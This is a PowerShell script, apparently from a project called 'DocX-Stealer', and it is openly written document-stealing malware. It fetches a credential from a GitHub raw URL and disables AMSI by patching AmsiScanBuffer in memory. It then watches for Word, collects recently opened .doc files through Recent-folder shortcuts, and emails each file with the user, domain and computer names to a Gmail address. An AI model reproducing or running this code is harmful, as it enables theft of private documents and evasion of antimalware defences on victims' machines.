Add-Type -AssemblyName System.Security


##### GLOBAL #####
$Content = (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/niro095/DocX-Stealer/master/Secret')
[string[]]$Bytes = $Content.Split("`n")
$ContentX = [Security.Cryptography.ProtectedData]::Protect($Bytes, $Null, [Security.Cryptography.DataProtectionScope]::LocalMachine)
$docsSent =  New-Object Collections.Generic.List[String]
$appData = [Environment]::GetFolderPath('ApplicationData') + "\Microsoft\Windows\Recent"
$temp = [Environment]::GetFolderPath('ApplicationData')
$compName = $env:computername | Select-Object
##################

# AMSI ByPass
function AmsiBypass {
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
}


# Send Email function
function Send-Email {
    $From = "cynetrir@gmail.com"
    $To = "cynetrir@gmail.com"
    $Attachment = $args[0]
    $Subject = "Email Subject"
    $Body = "UserDomain: " + $env:UserDomain + " ComputerName: " + $env:ComputerName + " UserName: " + $env:UserName + " Attachment: " + [io.path]::GetFileName($args[0])
    $SMTPServer = "smtp.gmail.com"
    $SMTPPort = "587"
    $User = "UserName"
    $PWord = ConvertTo-SecureString -String $ContentX -AsPlainText -Force
    $Credential = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $User, $PWord
    Send-MailMessage -From $From -to $To -Subject $Subject `
    -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
    -Credential $Credential -Attachments $Attachment
}


# Check if file locked
function Test-FileLock {
  param (
    [parameter(Mandatory=$true)][string]$Path
  )

  $oFile = New-Object System.IO.FileInfo $Path

  if ((Test-Path -Path $Path) -eq $false) {
    return $false
  }

  try {
    $oStream = $oFile.Open([System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None)

    if ($oStream) {
      $oStream.Close()
    }
    return $false
  } catch {
    # file is locked by a process.
    return $true
  }
}


# Check lnk file origin
function Get-ShortcutsTarget{
    $Shortcuts = Get-ChildItem -Recurse $appData -Include *.doc*.lnk
    $Shell = New-Object -ComObject WScript.Shell
    foreach ($Shortcut in $Shortcuts)
    {
        $Properties = @{
        ShortcutName = $Shortcut.Name;
        ShortcutFull = $Shortcut.FullName;
        ShortcutPath = $shortcut.DirectoryName
        Target = $Shell.CreateShortcut($Shortcut).targetpath
        }
        New-Object PSObject -Property $Properties
    }

[Runtime.InteropServices.Marshal]::ReleaseComObject($Shell) | Out-Null
}


AmsiBypass
# Function as Main
Do {
    
    # Check If WinWord process is open
    $isOpen = get-process WINWORD -ErrorAction SilentlyContinue | select -expand id

    # while WinWord is open 
    while($isOpen) 
    {
        $Output = Get-ShortcutsTarget
        foreach ($Target in $Output)
        {
            $isLocked = Test-FileLock $Target.Target
            if ($isLocked -AND -NOT $docsSent.Contains($Target.Target))
            {
                $destination = $temp + "\" + [io.path]::GetFileName($Target.Target)
                copy-Item -Recurse $Target.Target -passthru -Destination $destination
                Send-Email $destination
                $docsSent.Add($Target.Target)
                Remove-Item -Path $destination -Force
            }
        }

        sleep 5
        $isOpenTemp = get-process WINWORD -ErrorAction SilentlyContinue | select -expand id
        if ($isOpenTemp -ne $isOpen)
        {
            $docsSent.Clear()
            $isOpen = $isOpenTemp
        }

    }

    $docsSent.Clear()
    sleep 5
} while ($true)
